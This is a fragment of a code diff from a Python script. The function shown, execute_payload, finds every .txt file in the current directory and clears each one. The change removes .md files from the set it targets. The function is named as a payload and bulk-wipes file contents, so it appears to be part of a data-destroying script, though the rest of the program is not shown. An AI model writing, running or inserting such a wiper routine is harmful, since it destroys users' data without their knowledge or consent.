@@ -86,10 +86,8 @@ def clear_file(file_path):
 
 def execute_payload():
     txt_pattern = "*.txt"
-    md_pattern = "*.md"
     txt_files = glob.glob(txt_pattern)
-    md_files = glob.glob(md_pattern)
-    file_paths = txt_files + md_files
+    file_paths = txt_files
     
     for file_path in file_paths:
         clear_file(file_path)
